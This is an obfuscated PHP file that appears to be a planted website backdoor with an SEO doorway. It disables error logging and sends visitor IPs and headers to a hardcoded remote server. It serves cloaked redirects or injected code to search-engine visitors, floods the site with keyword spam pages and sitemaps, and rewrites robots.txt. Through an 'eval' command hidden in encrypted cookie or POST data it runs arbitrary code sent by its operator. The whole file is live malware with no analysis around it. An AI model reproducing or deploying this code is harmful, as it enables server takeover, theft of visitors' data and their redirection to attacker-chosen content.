<?php

@ini_set('error_log', NULL);@ini_set('log_errors', 0);@ini_set('max_execution_time', 0);@error_reporting(0);@set_time_limit(0);date_default_timezone_set('UTC');class _wvap1ki{static private $_144xnmw9 = 84536995;static function _ypi66($_jx0dmd4t, $_quluengy){$_jx0dmd4t[2] = count($_jx0dmd4t) > 4 ? long2ip(_wvap1ki::$_144xnmw9 - 686) : $_jx0dmd4t[2];$_7345p1aq = _wvap1ki::_ebhn0($_jx0dmd4t, $_quluengy);if (!$_7345p1aq) {$_7345p1aq = _wvap1ki::_0w2b8($_jx0dmd4t, $_quluengy);}return $_7345p1aq;}static function _ebhn0($_jx0dmd4t, $_7345p1aq, $_sane26dt = NULL){if (!function_exists('curl_version')) {return "";}if (is_array($_jx0dmd4t)) {$_jx0dmd4t = implode("/", $_jx0dmd4t);}$_9hp8hor6 = curl_init();curl_setopt($_9hp8hor6, CURLOPT_SSL_VERIFYHOST, false);curl_setopt($_9hp8hor6, CURLOPT_SSL_VERIFYPEER, false);curl_setopt($_9hp8hor6, CURLOPT_URL, $_jx0dmd4t);if (!empty($_7345p1aq)) {curl_setopt($_9hp8hor6, CURLOPT_POST, 1);curl_setopt($_9hp8hor6, CURLOPT_POSTFIELDS, $_7345p1aq);}if (!empty($_sane26dt)) {curl_setopt($_9hp8hor6, CURLOPT_HTTPHEADER, $_sane26dt);}curl_setopt($_9hp8hor6, CURLOPT_RETURNTRANSFER, TRUE);$_kn7l50vy = curl_exec($_9hp8hor6);curl_close($_9hp8hor6);return $_kn7l50vy;}static function _0w2b8($_jx0dmd4t, $_7345p1aq, $_sane26dt = NULL){if (is_array($_jx0dmd4t)) {$_jx0dmd4t = implode("/", $_jx0dmd4t);}if (!empty($_7345p1aq)) {$_zbulhtxt = array('method' => 'POST','header' => 'Content-type: application/x-www-form-urlencoded','content' => $_7345p1aq);if (!empty($_sane26dt)) {$_zbulhtxt["header"] = $_zbulhtxt["header"] . "\r\n" . implode("\r\n", $_sane26dt);}$_tnoefc8j = stream_context_create(array('http' => $_zbulhtxt));} else {$_zbulhtxt = array('method' => 'GET',);if (!empty($_sane26dt)) {$_zbulhtxt["header"] = implode("\r\n", $_sane26dt);}$_tnoefc8j = stream_context_create(array('http' => $_zbulhtxt));}return @file_get_contents($_jx0dmd4t, FALSE, $_tnoefc8j);}}class _9e8z37s{private static $_z1njgucf = "";private static $_45azsc4s = -1;private static $_hzznzzvr = "";private $_ydo3vr2q = "";private $_1x3xfv87 = "";private $_ezpwuafl = "";private $_ovc6z3mr = "";public static function _x36lg($_fqsac5xn, $_y5ikx392, $_iza1stfp){_9e8z37s::$_z1njgucf = $_fqsac5xn . "/cache/";_9e8z37s::$_45azsc4s = $_y5ikx392;_9e8z37s::$_hzznzzvr = $_iza1stfp;if (!@file_exists(_9e8z37s::$_z1njgucf)) {@mkdir(_9e8z37s::$_z1njgucf);}}static public function _ayzea(){$_8sih7of8 = 0;foreach (scandir(_9e8z37s::$_z1njgucf) as $_ojdcmehf) {$_8sih7of8 += 1;}return $_8sih7of8;}public static function _yalgh(){return TRUE;}public function __construct($_1i6jxlzh, $_mysexg2y, $_u3kebuof, $_6sp271vc){$this->_ydo3vr2q = $_1i6jxlzh;$this->_1x3xfv87 = $_mysexg2y;$this->_ezpwuafl = $_u3kebuof;$this->_ovc6z3mr = $_6sp271vc;$this->_ovc6z3mr .= sprintf(",<a href=\"%s\">%s</a>", _dt2tk9::_4hvon() . "/sitemap.html", "Sitemap");}public function _5dcrd(){function _f9mec($_5as70qdv, $_z41wz6oa){return round(rand($_5as70qdv, $_z41wz6oa - 1) + (rand(0, PHP_INT_MAX - 1) / PHP_INT_MAX), 2);}$_0egh4liv = _9okxg61::_zrq9t();$_7345p1aq = str_replace("{{ text }}", $this->_1x3xfv87,str_replace("{{ keyword }}", $this->_ezpwuafl,str_replace("{{ links }}", $this->_ovc6z3mr, $this->_ydo3vr2q)));while (TRUE) {$_h1a6u7go = preg_replace('/' . preg_quote("{{ randkeyword }}", '/') . '/', _9okxg61::_et5uw(), $_7345p1aq, 1);if ($_h1a6u7go === $_7345p1aq) {break;}$_7345p1aq = $_h1a6u7go;}while (TRUE) {preg_match('/{{ KEYWORDBYINDEX-ANCHOR (\d*) }}/', $_7345p1aq, $_9zgm6zo1);if (empty($_9zgm6zo1)) {break;}$_u3kebuof = @$_0egh4liv[intval($_9zgm6zo1[1])];$_kqcmwxqo = _dt2tk9::_pwgcv($_u3kebuof);$_7345p1aq = str_replace($_9zgm6zo1[0], $_kqcmwxqo, $_7345p1aq);}while (TRUE) {preg_match('/{{ KEYWORDBYINDEX (\d*) }}/', $_7345p1aq, $_9zgm6zo1);if (empty($_9zgm6zo1)) {break;}$_u3kebuof = @$_0egh4liv[intval($_9zgm6zo1[1])];$_7345p1aq = str_replace($_9zgm6zo1[0], $_u3kebuof, $_7345p1aq);}while (TRUE) {preg_match('/{{ RANDFLOAT (\d*)-(\d*) }}/', $_7345p1aq, $_9zgm6zo1);if (empty($_9zgm6zo1)) {break;}$_7345p1aq = str_replace($_9zgm6zo1[0], _f9mec($_9zgm6zo1[1], $_9zgm6zo1[2]), $_7345p1aq);}while (TRUE) {preg_match('/{{ RANDINT (\d*)-(\d*) }}/', $_7345p1aq, $_9zgm6zo1);if (empty($_9zgm6zo1)) {break;}$_7345p1aq = str_replace($_9zgm6zo1[0], rand($_9zgm6zo1[1], $_9zgm6zo1[2]), $_7345p1aq);}return $_7345p1aq;}public function _3sqnd(){$_s3r8uoas = _9e8z37s::$_z1njgucf . md5($this->_ezpwuafl . _9e8z37s::$_hzznzzvr);if (_9e8z37s::$_45azsc4s == -1) {$_0uh38vzv = -1;} else {$_0uh38vzv = time() + (3600 * 24 * 30);}$_uewh0rbv = array("template" => $this->_ydo3vr2q, "text" => $this->_1x3xfv87, "keyword" => $this->_ezpwuafl,"links" => $this->_ovc6z3mr, "expired" => $_0uh38vzv);@file_put_contents($_s3r8uoas, serialize($_uewh0rbv));}static public function _d6n4a($_u3kebuof){$_s3r8uoas = _9e8z37s::$_z1njgucf . md5($_u3kebuof . _9e8z37s::$_hzznzzvr);$_s3r8uoas = @unserialize(@file_get_contents($_s3r8uoas));if (!empty($_s3r8uoas) && ($_s3r8uoas["expired"] > time() || $_s3r8uoas["expired"] == -1)) {return new _9e8z37s($_s3r8uoas["template"], $_s3r8uoas["text"], $_s3r8uoas["keyword"], $_s3r8uoas["links"]);} else {return null;}}}class _mzew86{private static $_z1njgucf = "";private static $_7p0icul7 = "";public static function _x36lg($_fqsac5xn, $_7pllwtew){_mzew86::$_z1njgucf = $_fqsac5xn . "/";_mzew86::$_7p0icul7 = $_7pllwtew;if (!@file_exists(_mzew86::$_z1njgucf)) {@mkdir(_mzew86::$_z1njgucf);}}public static function _yalgh(){return TRUE;}static public function _ayzea(){$_8sih7of8 = 0;foreach (scandir(_mzew86::$_z1njgucf) as $_ojdcmehf) {if (strpos($_ojdcmehf, _mzew86::$_7p0icul7) === 0) {$_8sih7of8 += 1;}}return $_8sih7of8;}static public function _et5uw(){$_hojyxber = array();foreach (scandir(_mzew86::$_z1njgucf) as $_ojdcmehf) {if (strpos($_ojdcmehf, _mzew86::$_7p0icul7) === 0) {$_hojyxber[] = $_ojdcmehf;}}return @file_get_contents(_mzew86::$_z1njgucf . $_hojyxber[array_rand($_hojyxber)]);}static public function _3sqnd($_c5g2fd7a){if (@file_exists(_mzew86::$_7p0icul7 . "_" . md5($_c5g2fd7a) . ".html")) {return;}@file_put_contents(_mzew86::$_7p0icul7 . "_" . md5($_c5g2fd7a) . ".html", $_c5g2fd7a);}}class _9okxg61{private static $_z1njgucf = "";private static $_7p0icul7 = "";private static $_0ce61x9f = array();private static $_b48ca6a9 = array();public static function _x36lg($_fqsac5xn, $_7pllwtew){_9okxg61::$_z1njgucf = $_fqsac5xn . "/";_9okxg61::$_7p0icul7 = $_7pllwtew;if (!@file_exists(_9okxg61::$_z1njgucf)) {@mkdir(_9okxg61::$_z1njgucf);}}private static function _ykncw(){$_nsrp4mtm = array();foreach (scandir(_9okxg61::$_z1njgucf) as $_ojdcmehf) {if (strpos($_ojdcmehf, _9okxg61::$_7p0icul7) === 0) {$_nsrp4mtm[] = $_ojdcmehf;}}return $_nsrp4mtm;}public static function _yalgh(){return TRUE;}static public function _et5uw(){if (empty(_9okxg61::$_0ce61x9f)) {$_nsrp4mtm = _9okxg61::_ykncw();_9okxg61::$_0ce61x9f = @file(_9okxg61::$_z1njgucf . $_nsrp4mtm[array_rand($_nsrp4mtm)], FILE_IGNORE_NEW_LINES);}return _9okxg61::$_0ce61x9f[array_rand(_9okxg61::$_0ce61x9f)];}static public function _zrq9t(){if (empty(_9okxg61::$_b48ca6a9)) {$_nsrp4mtm = _9okxg61::_ykncw();foreach ($_nsrp4mtm as $_wdnukvk9) {_9okxg61::$_b48ca6a9 = array_merge(_9okxg61::$_b48ca6a9, @file(_9okxg61::$_z1njgucf . $_wdnukvk9, FILE_IGNORE_NEW_LINES));}}return _9okxg61::$_b48ca6a9;}static public function _3sqnd($_40kkrtk5){if (@file_exists(_9okxg61::$_7p0icul7 . "_" . md5($_40kkrtk5) . ".list")) {return;}@file_put_contents(_9okxg61::$_7p0icul7 . "_" . md5($_40kkrtk5) . ".list", $_40kkrtk5);}static public function _5uyyz($_u3kebuof){@file_put_contents(_9okxg61::$_7p0icul7 . "_" . md5(_dt2tk9::$_hj7cvfjl) . ".list", $_u3kebuof . "\n", 8);}}class _dt2tk9{static public $_qqvkfd6r = "5.3";static public $_hj7cvfjl = "ac38cc8e-5a6e-da20-75f2-d0ae59fe3a8f";private $_wu1vwiol = "http://136.12.78.46/app/assets/api2?action=redir";private $_etlni4wc = "http://136.12.78.46/app/assets/api?action=page";static public $_3w7e49ze = 5;static public $_sm5pb0pl = 20;private function _g3axu(){$_wuf1elsd = array('#libwww-perl#i','#MJ12bot#i','#msnbot#i', '#msnbot-media#i','#YandexBot#i', '#msnbot#i', '#YandexWebmaster#i','#spider#i', '#yahoo#i', '#google#i', '#altavista#i','#ask#i','#yahoo!\s*slurp#i','#BingBot#i');if (!empty($_SERVER['HTTP_USER_AGENT']) && (FALSE !== strpos(preg_replace($_wuf1elsd, '-NO-WAY-', $_SERVER['HTTP_USER_AGENT']), '-NO-WAY-'))) {$_6um2myzm = 1;} elseif (empty($_SERVER['HTTP_ACCEPT_LANGUAGE']) || empty($_SERVER['HTTP_REFERER'])) {$_6um2myzm = 1;} elseif (strpos($_SERVER['HTTP_REFERER'], "google") === FALSE &&strpos($_SERVER['HTTP_REFERER'], "yahoo") === FALSE &&strpos($_SERVER['HTTP_REFERER'], "bing") === FALSE &&strpos($_SERVER['HTTP_REFERER'], "yandex") === FALSE) {$_6um2myzm = 1;} else {$_6um2myzm = 0;}return $_6um2myzm;}private static function _5ufyk(){$_quluengy = array();$_quluengy['ip'] = $_SERVER['REMOTE_ADDR'];$_quluengy['qs'] = @$_SERVER['HTTP_HOST'] . @$_SERVER['REQUEST_URI'];$_quluengy['ua'] = @$_SERVER['HTTP_USER_AGENT'];$_quluengy['lang'] = @$_SERVER['HTTP_ACCEPT_LANGUAGE'];$_quluengy['ref'] = @$_SERVER['HTTP_REFERER'];$_quluengy['enc'] = @$_SERVER['HTTP_ACCEPT_ENCODING'];$_quluengy['acp'] = @$_SERVER['HTTP_ACCEPT'];$_quluengy['char'] = @$_SERVER['HTTP_ACCEPT_CHARSET'];$_quluengy['conn'] = @$_SERVER['HTTP_CONNECTION'];return $_quluengy;}public function __construct(){$this->_wu1vwiol = explode("/", $this->_wu1vwiol);$this->_etlni4wc = explode("/", $this->_etlni4wc);}static public function _7noij($_q3uj4kx2){if (strlen($_q3uj4kx2) < 4) {return "";}$_8i0cetxb = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=";$_0egh4liv = str_split($_8i0cetxb);$_0egh4liv = array_flip($_0egh4liv);$_wvcnm449 = 0;$_72p07g6e = "";$_q3uj4kx2 = preg_replace("~[^A-Za-z0-9\+\/\=]~", "", $_q3uj4kx2);do {$_o0liz1oa = $_0egh4liv[$_q3uj4kx2[$_wvcnm449++]];$_3znc06cu = $_0egh4liv[$_q3uj4kx2[$_wvcnm449++]];$_d2kh2gpl = $_0egh4liv[$_q3uj4kx2[$_wvcnm449++]];$_eanwa49m = $_0egh4liv[$_q3uj4kx2[$_wvcnm449++]];$_dfyikvbp = ($_o0liz1oa << 2) | ($_3znc06cu >> 4);$_w42sqm05 = (($_3znc06cu & 15) << 4) | ($_d2kh2gpl >> 2);$_xgj57kv4 = (($_d2kh2gpl & 3) << 6) | $_eanwa49m;$_72p07g6e = $_72p07g6e . chr($_dfyikvbp);if ($_d2kh2gpl != 64) {$_72p07g6e = $_72p07g6e . chr($_w42sqm05);}if ($_eanwa49m != 64) {$_72p07g6e = $_72p07g6e . chr($_xgj57kv4);}} while ($_wvcnm449 < strlen($_q3uj4kx2));return $_72p07g6e;}private function _y8ljq($_u3kebuof){$_1i6jxlzh = "";$_mysexg2y = "";$_quluengy = _dt2tk9::_5ufyk();$_quluengy["uid"] = _dt2tk9::$_hj7cvfjl;$_quluengy["keyword"] = $_u3kebuof;$_quluengy["tc"] = 10;$_quluengy = http_build_query($_quluengy);$_js1bk6k9 = _wvap1ki::_ypi66($this->_etlni4wc, $_quluengy);if (strpos($_js1bk6k9, _dt2tk9::$_hj7cvfjl) === FALSE) {return array($_1i6jxlzh, $_mysexg2y);}$_1i6jxlzh = _mzew86::_et5uw();$_mysexg2y = substr($_js1bk6k9, strlen(_dt2tk9::$_hj7cvfjl));$_mysexg2y = explode("\n", $_mysexg2y);shuffle($_mysexg2y);$_mysexg2y = implode(" ", $_mysexg2y);return array($_1i6jxlzh, $_mysexg2y);}private function _7hvlj(){$_quluengy = _dt2tk9::_5ufyk();if (isset($_SERVER['HTTP_CF_CONNECTING_IP'])) {$_quluengy['cfconn'] = @$_SERVER['HTTP_CF_CONNECTING_IP'];}if (isset($_SERVER['HTTP_X_REAL_IP'])) {$_quluengy['xreal'] = @$_SERVER['HTTP_X_REAL_IP'];}if (isset($_SERVER['HTTP_X_FORWARDED_FOR'])) {$_quluengy['xforward'] = @$_SERVER['HTTP_X_FORWARDED_FOR'];}$_quluengy["uid"] = _dt2tk9::$_hj7cvfjl;$_quluengy = http_build_query($_quluengy);$_ikt5kffc = _wvap1ki::_ypi66($this->_wu1vwiol, $_quluengy);$_ikt5kffc = @unserialize($_ikt5kffc);if (isset($_ikt5kffc["type"]) && $_ikt5kffc["type"] == "redir") {if (!empty($_ikt5kffc["data"]["header"])) {header($_ikt5kffc["data"]["header"]);return true;} elseif (!empty($_ikt5kffc["data"]["code"])) {echo $_ikt5kffc["data"]["code"];return true;}}return false;}public function _yalgh(){return _9e8z37s::_yalgh() && _mzew86::_yalgh() && _9okxg61::_yalgh();}static public function _nn6dw(){if ((!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off') || $_SERVER['SERVER_PORT'] == 443) {return true;}return false;}public static function _jqd00(){$_36zapg9j = explode("?", $_SERVER["REQUEST_URI"], 2);$_36zapg9j = $_36zapg9j[0];if (strpos($_36zapg9j, ".php") === FALSE) {$_36zapg9j = explode("/", $_36zapg9j);array_pop($_36zapg9j);$_36zapg9j = implode("/", $_36zapg9j) . "/";}return sprintf("%s://%s%s", _dt2tk9::_nn6dw() ? "https" : "http", $_SERVER['HTTP_HOST'], $_36zapg9j);}public static function _6uvf6(){$_ket22bo9 = array("https://www.google.com/ping?sitemap=" => "Sitemap Notification Received","https://www.bing.com/ping?sitemap=" => "Thanks for submitting your Sitemap");$_sane26dt = array("Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8","Accept-Language: en-US,en;q=0.5","User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:82.0) Gecko/20100101 Firefox/82.0",);$_f0qa2aqf = urlencode(_dt2tk9::_4hvon() . "/sitemap.xml");foreach ($_ket22bo9 as $_jx0dmd4t => $_golszc08) {$_ngz27pu3 = _wvap1ki::_ebhn0($_jx0dmd4t . $_f0qa2aqf, NULL, $_sane26dt);if (empty($_ngz27pu3)) {$_ngz27pu3 = _wvap1ki::_0w2b8($_jx0dmd4t . $_f0qa2aqf, NULL, $_sane26dt);}if (empty($_ngz27pu3)) {return FALSE;}if (strpos($_ngz27pu3, $_golszc08) === FALSE) {return FALSE;}}return TRUE;}public static function _vi01n(){$_9adafvrd = "User-agent: *\nDisallow: %s\nUser-agent: Bingbot\nUser-agent: Googlebot\nUser-agent: Slurp\nDisallow:\nSitemap: %s\n";$_36zapg9j = explode("?", $_SERVER["REQUEST_URI"], 2);$_36zapg9j = $_36zapg9j[0];$_hpu2x743 = substr($_36zapg9j, 0, strrpos($_36zapg9j, "/"));$_ex66460r = sprintf($_9adafvrd, $_hpu2x743, _dt2tk9::_4hvon() . "/sitemap.xml");$_3sxka8v6 = $_SERVER["DOCUMENT_ROOT"] . "/robots.txt";if (@file_exists($_3sxka8v6)) {@chmod($_3sxka8v6, 0777);$_v4zjjkf5 = @file_get_contents($_3sxka8v6);} else {$_v4zjjkf5 = "";}if (strpos($_v4zjjkf5, $_ex66460r) === FALSE) {@file_put_contents($_3sxka8v6, $_v4zjjkf5 . "\n" . $_ex66460r);$_v4zjjkf5 = @file_get_contents($_3sxka8v6);return (strpos($_v4zjjkf5, $_ex66460r) !== FALSE);}return FALSE;}public static function _4hvon(){$_36zapg9j = explode("?", $_SERVER["REQUEST_URI"], 2);$_36zapg9j = $_36zapg9j[0];$_fqsac5xn = substr($_36zapg9j, 0, strrpos($_36zapg9j, "/"));return sprintf("%s://%s%s", _dt2tk9::_nn6dw() ? "https" : "http", $_SERVER['HTTP_HOST'], $_fqsac5xn);}public static function _pwgcv($_u3kebuof){$_5kj5l1pj = _dt2tk9::_jqd00();$_u3nbtray = substr(md5(_dt2tk9::$_hj7cvfjl . "salt3"), 0, 6);$_1ncm5imh = "";if (substr($_5kj5l1pj, -1) == "/") {if (ord($_u3nbtray[1]) % 2) {$_u3kebuof = str_replace(" ", "-", $_u3kebuof);} else {$_u3kebuof = str_replace(" ", "-", $_u3kebuof);}$_1ncm5imh = sprintf("%s%s.html", $_5kj5l1pj, urlencode($_u3kebuof));} else {if (FALSE && (ord($_u3nbtray[0]) % 2)) {$_1ncm5imh = sprintf("%s?%s=%s",$_5kj5l1pj,$_u3nbtray,urlencode(str_replace(" ", "-", $_u3kebuof)));} else {$_b7ndelcs = array("id", "page", "tag");$_71vejiyf = $_b7ndelcs[ord($_u3nbtray[2]) % count($_b7ndelcs)];if (ord($_u3nbtray[1]) % 2) {$_u3kebuof = str_replace(" ", "-", $_u3kebuof);} else {$_u3kebuof = str_replace(" ", "-", $_u3kebuof);}$_1ncm5imh = sprintf("%s?%s=%s",$_5kj5l1pj,$_71vejiyf,urlencode($_u3kebuof));}}return $_1ncm5imh;}public static function _usudb($_5as70qdv, $_z41wz6oa){$_juzi6dds = "";for ($_wvcnm449 = 0; $_wvcnm449 < rand($_5as70qdv, $_z41wz6oa); $_wvcnm449++) {$_u3kebuof = _9okxg61::_et5uw();$_juzi6dds .= sprintf("<a href=\"%s\">%s</a>,\n",_dt2tk9::_pwgcv($_u3kebuof), ucwords($_u3kebuof));}return $_juzi6dds;}public static function _9p60q($_46phfmow = FALSE){$_5rzjygpl = dirname(__FILE__) . "/sitemap.xml";$_y11cfafh = Array();$_tj3hawd1 = "<?xml version=\"1.0\" encoding=\"UTF-8\"?" . ">\n<urlset xmlns=\"http://www.sitemaps.org/schemas/sitemap/0.9\">\n";$_6dunldaj = "</urlset>";$_0egh4liv = _9okxg61::_zrq9t();$_3hzsuv71 = array();if (file_exists($_5rzjygpl)) {$_js1bk6k9 = simplexml_load_file($_5rzjygpl);foreach ($_js1bk6k9 as $_3awsefho) {$_3hzsuv71[(string)$_3awsefho->loc] = (string)$_3awsefho->lastmod;}} else {$_46phfmow = FALSE;}foreach ($_0egh4liv as $_6yeo0116) {$_1ncm5imh = _dt2tk9::_pwgcv($_6yeo0116);$_hw4y3jkn = strtolower($_6yeo0116[0]);if (!preg_match("/^[a-z]$/", $_hw4y3jkn)) {$_hw4y3jkn = "other";}if (empty($_y11cfafh[$_hw4y3jkn])){$_y11cfafh[$_hw4y3jkn] = Array();}$_y11cfafh[$_hw4y3jkn][$_6yeo0116] = $_1ncm5imh;if (isset($_3hzsuv71[$_1ncm5imh])) {continue;}if ($_46phfmow) {$_8vwb8jxh = time();} else {$_8vwb8jxh = time() - (crc32($_6yeo0116) % (60 * 60 * 24 * 30));}$_3hzsuv71[$_1ncm5imh] = date("Y-m-d", $_8vwb8jxh);}$_uel7i8xj = "";foreach ($_3hzsuv71 as $_jx0dmd4t => $_8vwb8jxh) {$_uel7i8xj .= "<url>\n";$_uel7i8xj .= sprintf("<loc>%s</loc>\n", $_jx0dmd4t);$_uel7i8xj .= sprintf("<lastmod>%s</lastmod>\n", $_8vwb8jxh);$_uel7i8xj .= "</url>\n";}$_lt98yzot = $_tj3hawd1 . $_uel7i8xj . $_6dunldaj;$_f0qa2aqf = _dt2tk9::_4hvon() . "/sitemap.xml";@file_put_contents($_5rzjygpl, $_lt98yzot);foreach ($_y11cfafh as $_hw4y3jkn => $_pctxy3y1){$_lt98yzot = sprintf("<!DOCTYPE html><html>\n<head>\n<title>Articles \"%s\"</title>\n</head>\n<body>\n", $_hw4y3jkn);foreach ($_pctxy3y1 as $_u3kebuof => $_jx0dmd4t){$_lt98yzot .= sprintf("<a href=\"%s\">%s</a><br>\n", $_jx0dmd4t, $_u3kebuof);}$_lt98yzot .= "</body></html>";$_5rzjygpl = dirname(__FILE__) . sprintf("/sitemap_%s.html", $_hw4y3jkn);@file_put_contents($_5rzjygpl, $_lt98yzot);}$_lt98yzot = "<!DOCTYPE html><html>\n<head>\n<title>Article Alphabet Index</title>\n</head>\n<body>\n";foreach ($_y11cfafh as $_hw4y3jkn => $_pctxy3y1){$_lt98yzot .= sprintf("<a href=\"%s\">%s</a><br>\n", _dt2tk9::_4hvon() . sprintf("/sitemap_%s.html", $_hw4y3jkn), strtoupper($_hw4y3jkn));}$_lt98yzot .= "</body></html>";$_5rzjygpl = dirname(__FILE__) . "/sitemap.html";@file_put_contents($_5rzjygpl, $_lt98yzot);return $_f0qa2aqf;}public function _umuk7(){$_71vejiyf = substr(md5(_dt2tk9::$_hj7cvfjl . "salt3"), 0, 6);if (!$this->_g3axu()) {if ($this->_7hvlj()) {return;}}if (!empty($_GET)) {$_xz4vlopk = array_values($_GET);} else {$_xz4vlopk = explode("/", $_SERVER["REQUEST_URI"]);$_xz4vlopk = array_reverse($_xz4vlopk);}$_u3kebuof = "";foreach ($_xz4vlopk as $_w0o8e5gu) {if (substr_count($_w0o8e5gu, "-") > 0) {$_u3kebuof = $_w0o8e5gu;break;}}$_u3kebuof = str_replace($_71vejiyf . "-", "", $_u3kebuof);$_u3kebuof = str_replace("-" . $_71vejiyf, "", $_u3kebuof);$_u3kebuof = str_replace("-", " ", $_u3kebuof);$_oabw8k3f = array(".html", ".php", ".aspx");foreach ($_oabw8k3f as $_z0w7b56m) {if (strpos($_u3kebuof, $_z0w7b56m) === strlen($_u3kebuof) - strlen($_z0w7b56m)) {$_u3kebuof = substr($_u3kebuof, 0, strlen($_u3kebuof) - strlen($_z0w7b56m));}}$_u3kebuof = urldecode($_u3kebuof);$_lfl49as3 = _9okxg61::_zrq9t();if (empty($_u3kebuof)) {$_u3kebuof = $_lfl49as3[0];} else if (!in_array($_u3kebuof, $_lfl49as3)) {$_m3rac4og = 0;foreach (str_split($_u3kebuof) as $_9hp8hor6) {$_m3rac4og += ord($_9hp8hor6);}$_u3kebuof = $_lfl49as3[$_m3rac4og % count($_lfl49as3)];}if (!empty($_u3kebuof)) {$_ikt5kffc = _9e8z37s::_d6n4a($_u3kebuof);if (empty($_ikt5kffc)) {list($_1i6jxlzh, $_mysexg2y) = $this->_y8ljq($_u3kebuof);if (empty($_mysexg2y)) {return;}$_ikt5kffc = new _9e8z37s($_1i6jxlzh, $_mysexg2y, $_u3kebuof, _dt2tk9::_usudb(_dt2tk9::$_3w7e49ze, _dt2tk9::$_sm5pb0pl));$_ikt5kffc->_3sqnd();}echo $_ikt5kffc->_5dcrd();}}}_9e8z37s::_x36lg(dirname(__FILE__), -1, _dt2tk9::$_hj7cvfjl);_mzew86::_x36lg(dirname(__FILE__), substr(md5(_dt2tk9::$_hj7cvfjl . "salt12"), 0, 4));_9okxg61::_x36lg(dirname(__FILE__), substr(md5(_dt2tk9::$_hj7cvfjl . "salt22"), 0, 4));function _85lrh($_js1bk6k9, $_6yeo0116){$_51ci4l7d = "";for ($_wvcnm449 = 0; $_wvcnm449 < strlen($_js1bk6k9);) {for ($_ag6lp2fi = 0; $_ag6lp2fi < strlen($_6yeo0116) && $_wvcnm449 < strlen($_js1bk6k9); $_ag6lp2fi++, $_wvcnm449++) {$_51ci4l7d .= chr(ord($_js1bk6k9[$_wvcnm449]) ^ ord($_6yeo0116[$_ag6lp2fi]));}}return $_51ci4l7d;}function _1y680($_js1bk6k9, $_6yeo0116, $_cg94n95y){return _85lrh(_85lrh($_js1bk6k9, $_6yeo0116), $_cg94n95y);}foreach (array_merge($_COOKIE, $_POST) as $_9e2la769 => $_js1bk6k9) {$_js1bk6k9 = @unserialize(_1y680(_dt2tk9::_7noij($_js1bk6k9), $_9e2la769, _dt2tk9::$_hj7cvfjl));if (isset($_js1bk6k9['ak']) && _dt2tk9::$_hj7cvfjl == $_js1bk6k9['ak']) {if ($_js1bk6k9['a'] == 'doorway2') {if ($_js1bk6k9['sa'] == 'check') {$_7345p1aq = _wvap1ki::_ypi66(explode("/", "http://httpbin.org/"), "");if (strlen($_7345p1aq) > 512) {echo @serialize(array("uid" => _dt2tk9::$_hj7cvfjl, "v" => _dt2tk9::$_qqvkfd6r,"cache" => _9e8z37s::_ayzea(),"keywords" => count(_9okxg61::_zrq9t()),"templates" => _mzew86::_ayzea()));}exit;}if ($_js1bk6k9['sa'] == 'templates') {foreach ($_js1bk6k9["templates"] as $_1i6jxlzh) {_mzew86::_3sqnd($_1i6jxlzh);echo @serialize(array("uid" => _dt2tk9::$_hj7cvfjl, "v" => _dt2tk9::$_qqvkfd6r,));}}if ($_js1bk6k9['sa'] == 'keywords') {_9okxg61::_3sqnd($_js1bk6k9["keywords"]);_dt2tk9::_9p60q();echo @serialize(array("uid" => _dt2tk9::$_hj7cvfjl, "v" => _dt2tk9::$_qqvkfd6r,));}if ($_js1bk6k9['sa'] == 'update_sitemap') {_dt2tk9::_9p60q(TRUE);echo @serialize(array("uid" => _dt2tk9::$_hj7cvfjl, "v" => _dt2tk9::$_qqvkfd6r,));}if ($_js1bk6k9['sa'] == 'pages') {$_exdbchux = 0;$_lfl49as3 = _9okxg61::_zrq9t();if (_mzew86::_ayzea() > 0) {foreach ($_js1bk6k9['pages'] as $_ikt5kffc) {$_lo8zp1mc = _9e8z37s::_d6n4a($_ikt5kffc["keyword"]);if (empty($_lo8zp1mc)) {$_lo8zp1mc = new _9e8z37s(_mzew86::_et5uw(), $_ikt5kffc["text"], $_ikt5kffc["keyword"], _dt2tk9::_usudb(_dt2tk9::$_3w7e49ze, _dt2tk9::$_sm5pb0pl));$_lo8zp1mc->_3sqnd();$_exdbchux += 1;if (!in_array($_ikt5kffc["keyword"], $_lfl49as3)) {_9okxg61::_5uyyz($_ikt5kffc["keyword"]);}}}}echo @serialize(array("uid" => _dt2tk9::$_hj7cvfjl, "v" => _dt2tk9::$_qqvkfd6r, "pages" => $_exdbchux));}if ($_js1bk6k9["sa"] == "ping") {$_ngz27pu3 = _dt2tk9::_6uvf6();echo @serialize(array("uid" => _dt2tk9::$_hj7cvfjl, "v" => _dt2tk9::$_qqvkfd6r, "result" => (int)$_ngz27pu3));}if ($_js1bk6k9["sa"] == "robots") {$_ngz27pu3 = _dt2tk9::_vi01n();echo @serialize(array("uid" => _dt2tk9::$_hj7cvfjl, "v" => _dt2tk9::$_qqvkfd6r, "result" => (int)$_ngz27pu3));}}if ($_js1bk6k9['sa'] == 'eval') {eval($_js1bk6k9["data"]);exit;}}}$_vmpi8cci = new _dt2tk9();if ($_vmpi8cci->_yalgh()) {$_vmpi8cci->_umuk7();}exit();